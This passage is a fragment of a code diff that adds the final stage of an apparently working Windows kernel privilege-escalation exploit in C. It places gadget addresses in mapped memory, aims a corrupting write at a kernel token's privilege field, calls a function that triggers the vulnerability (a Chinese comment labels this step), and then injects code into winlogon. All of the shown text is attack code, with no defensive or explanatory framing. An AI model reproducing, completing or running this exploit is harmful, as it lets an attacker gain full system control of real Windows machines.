+		VirtualAllocEx((HANDLE)-1, pExpFuncAddeInKrnl, 0x100, MEM_COMMIT, PAGE_READWRITE);
+
+		memset(pExpFuncAddeInKrnl, 0xCC, 0x100);
+		printf(">>> %p\r\n", pExpFuncAddeInKrnl);
+		//*(ULONG64*)((ULONG64)pExpFuncAddeInKrnl + 0x88) = (ULONG64)((ULONG64)(GadgetAddr)+0x60);
+		*(ULONG64*)((ULONG64)pExpFuncAddeInKrnl + 0x88) = GadgetAddr;
+		*(ULONG64*)((ULONG64)pExpFuncAddeInKrnl + 0x98) = GadgetAddr;
+		*(ULONG64*)(pContainer) = (ULONG64)(((ULONG64)pExpFuncAddeInKrnl)+0x80);
+		*(ULONG64*)((ULONG64)pContainer + 0x8) = ktoken + 0x40;
+		getchar();
+		// 触发漏洞
+		triggerPoc(pContainer);
+		InjectToWinlogon();
+
+
+	}
+
+	printf("%p\r\n", datas);
+
+
+	system("pause");
+	return 0;
+
+}
